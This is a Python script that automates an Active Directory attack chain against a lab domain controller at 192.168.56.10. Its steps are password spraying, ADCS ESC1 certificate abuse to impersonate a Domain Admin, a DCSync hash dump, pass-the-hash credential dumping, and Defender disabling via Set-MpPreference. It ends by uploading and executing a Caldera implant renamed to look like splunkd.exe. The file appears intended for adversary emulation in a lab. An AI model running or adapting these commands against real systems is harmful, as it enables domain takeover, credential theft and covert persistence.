"""
This script is responsible for automating the attack on the target machine (192.168.56.10).
The scenario starts with an "assumed breach", where the attacker has already gained initial access to the internal network (192.168.56.0/24).
The attacker has some valid credentials, but needs to spray them to find a working combination.

Here are the relevant IP addresses
- Attacker Machine: 192.168.56.100
- Target Machine: 192.168.56.10 (KINGSLANDING$)

The attack takes form in the following steps:
1. Attacker runs an nmap scan on 192.168.56.10
2. Attacker attempts NULL authentication against 192.168.56.10
3. Attacker attempts to spray credentials against robert.baratheon (Domain Admin), ends up locking the account
4. Attacker conducts a password spray against all known accounts instead to prevent further lockouts, getting a successful login on jaime.lannister
5. Attacker dumps users, groups, and runs multiple enumeration scripts to gather information
6. Attacker enumerates ADCS and discovers a Certificate Template that can be abused to request a certificate as Domain Admin
7. Attacker requests a certificate for cersei.lannister using the discovered template (ESC1)
8. Attacker uses the certificate to authenticate as Domain Admin and dump the entire Active Directory database (DCSync)
9. Attacker starts authenticating as Administrator, running some sample commands and modules
10. Attacker runs the Caldera implant on the target machine
11. A caldera operation is triggered, running multiple defense-evasion techniques
12. Another caldera operation is triggered, running multiple post-exploitation techniques (persistence, credential access, discovery, lateral movement)
"""
import os
import re
import time
import subprocess
from base64 import standard_b64encode
from typing import Tuple

from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# Helper functions
def run_command(command: str) -> Tuple[bool, str]:
    """Run a shell command, wait for it to complete, and return the output."""

    sleep_time = round(len(command) * 0.5) + (os.urandom(1)[0] % 3)
    print(f"{Fore.CYAN}[*] Sleeping for {sleep_time} seconds before running command: {Style.BRIGHT}{command}{Style.RESET_ALL}")
    time.sleep(sleep_time)

    print(f"{Fore.BLUE}{Style.BRIGHT}[+] Running command: {Style.BRIGHT}{command}{Style.RESET_ALL}")
    start_time = time.time()
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    if result.returncode != 0:
        print(f"{Fore.RED}[-] Error running command: {Style.BRIGHT}{command}{Style.RESET_ALL} --- {result.stderr}{Style.RESET_ALL}")
        return False, result.stderr
    print(f"{Fore.GREEN}{Style.BRIGHT}[+] Completed command: {Style.BRIGHT}{command}{Style.RESET_ALL} - Time taken: {time.time() - start_time:.2f} seconds{Style.RESET_ALL}")
    return True, result.stdout

# Step 1: Nmap Scan
run_command("nmap -sS -T5 -Pn -n 192.168.56.10")

# Step 2: NULL Authentication Attempt
run_command("nxc smb 192.168.56.10 -u '' -p ''")

# Step 3: Credential Spraying against robert.baratheon
run_command("nxc smb 192.168.56.10 -u 'robert.baratheon' -p /home/kali/passwords.txt")

# Step 4: Password Spraying against all known accounts
run_command("nxc smb 192.168.56.10 -u /home/kali/users.txt -p 'cersei'")

# Step 5: Dump Users and Groups
run_command("nxc ldap 192.168.56.10 -u 'jaime.lannister' -p 'cersei' --users --groups --computers --dc-list --get-sid --bloodhound -c All --dns-server 192.168.56.10 -d sevenkingdoms.local")
run_command("nxc ldap 192.168.56.10 -u 'jaime.lannister' -p 'cersei' -M get-desc-users")
run_command("nxc ldap 192.168.56.10 -u 'jaime.lannister' -p 'cersei' -M laps")

# Step 6: Enumerate ADCS
run_command("nxc ldap 192.168.56.10 -u 'jaime.lannister' -p 'cersei' -M adcs")
run_command("certipy-ad find -u 'jaime.lannister@sevenkingdoms.local' -p 'cersei' -vulnerable -enabled -ns 192.168.56.10 -stdout")

# Step 7: Request Certificate for cersei.lannister
run_command("yes | certipy-ad req -u 'jaime.lannister@sevenkingdoms.local' -p 'cersei' -target kingslanding.sevenkingdoms.local -ns 192.168.56.10 -ca 'SEVENKINGDOMS-CA' -template 'ESC1' -upn 'cersei.lannister@sevenkingdoms.local' -out cersei.pfx")
cersei_ntlm = run_command("yes | certipy-ad auth -pfx ./cersei.pfx -dc-ip 192.168.56.10 -ns 192.168.56.10")[1].split(":")[-1].strip()
print(f"{Fore.YELLOW}{Style.BRIGHT}[+] Extracted NTLM hash for cersei.lannister: {cersei_ntlm}{Style.RESET_ALL}")

# Step 8: DCSync as Domain Admin
run_command(f"nxc smb 192.168.56.10 -u 'cersei.lannister' -H '{cersei_ntlm}'")
dcsync_output = run_command(f"yes | nxc smb 192.168.56.10 -u 'cersei.lannister' -H '{cersei_ntlm}' --ntds")

# Extract "Administrator:500:<hash>:<hash>:::"
admin_hash = re.search(r'Administrator:500:([^\s:]+):([^\s:]+):::', dcsync_output[1])
print(f"{Fore.YELLOW}{Style.BRIGHT}[+] Extracted NTLM hash for Administrator: {admin_hash.group(1)}:{admin_hash.group(2)}{Style.RESET_ALL}")
admin_ntlm = f"{admin_hash.group(1)}:{admin_hash.group(2)}"

# Step 9: Authenticate as Administrator and run modules
run_command(f"nxc smb 192.168.56.10 -u 'Administrator' -H '{admin_ntlm}'")
run_command(f"nxc smb 192.168.56.10 -u 'Administrator' -H '{admin_ntlm}' --sam --lsa --dpapi nosystem")
run_command(f"nxc smb 192.168.56.10 -u 'Administrator' -H '{admin_ntlm}' -M nanodump")
run_command(f"nxc smb 192.168.56.10 -u 'Administrator' -H '{admin_ntlm}' -M reg-winlog")
run_command(f"echo -e 'whoami\nexit' | evil-winrm -i 192.168.56.10 -u 'Administrator' -H '{admin_ntlm}' || return 0")

# Step 10: Download, Obfuscate, Upload and Execute Caldera Implant
run_command("curl -sk -X POST -H 'platform:windows' -H 'file:sandcat.go' -H 'architecture:amd64' -H 'server:http://192.168.56.100:8888' -H 'group:red' http://127.0.0.1:8888/file/download --output splunkd.exe")
run_command("upx --best ./splunkd.exe")
run_command(f'echo -e \'cd "/Program Files"\\nBypass-4MSI\\nSet-MpPreference -DisableIntrusionPreventionSystem 1;Set-MpPreference -DisableIOAVProtection 1;Set-MpPreference -DisableRealtimeMonitoring 1;Set-MpPreference -DisableScriptScanning 1;Set-MpPreference -EnableControlledFolderAccess Disabled;\\nupload splunkd.exe\\nwmic process call create "C:\Program Files\splunkd.exe"\\nStart-Sleep -Seconds 10\\nexit\' | evil-winrm -i 192.168.56.10 -u \'Administrator\' -H \'{admin_ntlm}\'')